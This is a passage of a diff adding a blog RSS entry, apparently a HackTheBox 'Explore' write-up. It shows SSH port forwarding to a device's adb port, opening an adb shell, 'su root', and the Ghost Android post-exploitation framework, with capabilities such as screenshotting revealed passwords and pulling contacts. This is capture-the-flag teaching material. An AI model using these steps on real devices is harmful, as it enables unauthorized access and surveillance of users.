+&lt;li&gt;&lt;code&gt;L&lt;/code&gt;: This specifies that we are going to use a Local Port Forwarding. What we are going to do in this case is make all traffic sent to port &lt;strong&gt;6666&lt;/strong&gt; on our local host to be forwarded to port &lt;strong&gt;5555&lt;/strong&gt; on the target device via the stablished ssh connection.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-fN&lt;/code&gt;: This is a combined switch that does two things: &lt;code&gt;-f&lt;/code&gt; backgrounds the shell immediately so that we have our own terminal back. &lt;code&gt;-N&lt;/code&gt; tells SSH that it doesn&amp;rsquo;t need to execute any commands, only set up the connection.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Of cource since we are going to make an ssh connection as the Kristi user we will get asked for the password we previously got. Hitting enter will background the command and will seem like it did nothing, however the connection was made and is active as we can see below:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/4.png&#34; alt=&#34;Pasted image 20210627133307.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;What we have to do now, is repeat the steps we made at the start with &lt;strong&gt;adb&lt;/strong&gt;, however we will now connect on port 6666 on our machine! What is going to happen, is that this connection will be forwarded on port 5555 of the target machine, letting us right in. We start by connecting to port 6666 with &lt;strong&gt;adb&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb connect localhost:6666
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/5.png&#34; alt=&#34;Pasted image 20210627132719.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The message states that we are connected, so the next step would be to list our connections to confirm it:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb devices -l
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/6.png&#34; alt=&#34;Pasted image 20210627132916.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We see that indeed we are connected to localhost:6666 and we get some info about the device we are connected to. We are now able to execute the last step, which is launching a shell on that device. To do this we use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb -s localhost:6666 shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/7.png&#34; alt=&#34;Pasted image 20210627132951.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We now have a shell on the device. While the &lt;code&gt;whoami&lt;/code&gt; command shows us that we are not root, the &lt;strong&gt;shell&lt;/strong&gt; user of &lt;strong&gt;adb&lt;/strong&gt; is meant for developers and has more privileges than other users, including the ability to change to the superuser (root). There is a great article to read about the &lt;strong&gt;shell&lt;/strong&gt; user permissions listed on the &lt;strong&gt;Resources&lt;/strong&gt; section at the end of this post:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;su root
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/8.png&#34; alt=&#34;Pasted image 20210627133103.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;exploring-ghost-framework&#34;&gt;Exploring Ghost Framework&lt;/h1&gt;
+&lt;p&gt;Searching around the Internet, i came across a very intersting tool, called &lt;strong&gt;Ghost Framework&lt;/strong&gt;, an &amp;ldquo;Android post-exploitation framework that exploits the Android Debug Bridge to remotely access an Android device&amp;rdquo;. First we need to dowload it with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 install git+https://github.com/EntySec/Ghost
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The we can run it with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ghost
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This will open the Ghost Framework, where we can enter &lt;code&gt;help&lt;/code&gt; to see our available options:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/9.png&#34; alt=&#34;Pasted image 20210705053951.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;All we need to do is connect to the device. We have already port forwarded our traffic from our local port 6666 to the port 5555 of the target, so we are going to connect to &lt;strong&gt;localhost:6666&lt;/strong&gt; with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;connect localhost:6666
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;We can then also type &lt;code&gt;help&lt;/code&gt; to see our options:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/10.png&#34; alt=&#34;Pasted image 20210705054135.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To get root all we need to do is type &lt;code&gt;shell&lt;/code&gt; to get into a shell on the device as the user &lt;strong&gt;shell&lt;/strong&gt; and then &lt;code&gt;su root&lt;/code&gt; to get root, the same way we did before.&lt;/p&gt;
+&lt;p&gt;While getting root on this particular device with Ghost Framwork is not needed, it can do many more things, that may be very useful in a real life scenario. With Ghost Framework we can:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Show device activity information.&lt;/li&gt;
+&lt;li&gt;Show device battery state.&lt;/li&gt;
+&lt;li&gt;Show device network information.&lt;/li&gt;
+&lt;li&gt;Show device system information.&lt;/li&gt;
+&lt;li&gt;Control device wifi service.&lt;/li&gt;
+&lt;li&gt;Click the specified x and y axis. (For example click the show password while a user is on a login screen and then take a screenshot of the password)&lt;/li&gt;
+&lt;li&gt;Control device keyboard.&lt;/li&gt;
+&lt;li&gt;Press/Simulate keypress on target device.&lt;/li&gt;
+&lt;li&gt;Open a URL on the device.&lt;/li&gt;
+&lt;li&gt;Control device screen.&lt;/li&gt;
+&lt;li&gt;Take a screenshot from the device.&lt;/li&gt;
+&lt;li&gt;Open a shell on the target device.&lt;/li&gt;
+&lt;li&gt;Type a specified text on the device.&lt;/li&gt;
+&lt;li&gt;Upload a local file from our machine to the target device.&lt;/li&gt;
+&lt;li&gt;Download files from the target device.&lt;/li&gt;
+&lt;li&gt;Show the Contacts that are saved on the device.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;All in all, Ghost Framework seems to be another simple yet powerful tool to use for Android Post-Exploitation.&lt;/p&gt;
+&lt;h1 id=&#34;useful-resources&#34;&gt;Useful Resources:&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Learn about adb&lt;/strong&gt;: &lt;a href=&#34;https://developer.android.com/studio/command-line/adb&#34;&gt;https://developer.android.com/studio/command-line/adb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Learn about shell user permissions&lt;/strong&gt;: &lt;a href=&#34;https://doridori.github.io/Android-Security-welcome-to-shell/#sthash.Btvzl8T0.dpbs&#34;&gt;https://doridori.github.io/Android-Security-welcome-to-shell/#sthash.Btvzl8T0.dpbs&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Ghost Framework Github Page&lt;/strong&gt;: &lt;a href=&#34;https://github.com/EntySec/Ghost&#34;&gt;https://github.com/EntySec/Ghost&lt;/a&gt;&lt;/p&gt;
+</description>
+                
+                
+                
+                    
+                    
+                    
+                        
+                        
+                        
+                            
+                                <category domain="https://netuserdoomdesire.github.io/posts/writeups/">posts\Writeups\</category>
+                            
+                        
+                    
+                
+                
+                
+                    
+                        
+                    
+                        
+                    
+                
+            </item>
         
             <item>
                 <title>Love Writeup (HackTheBox)</title>
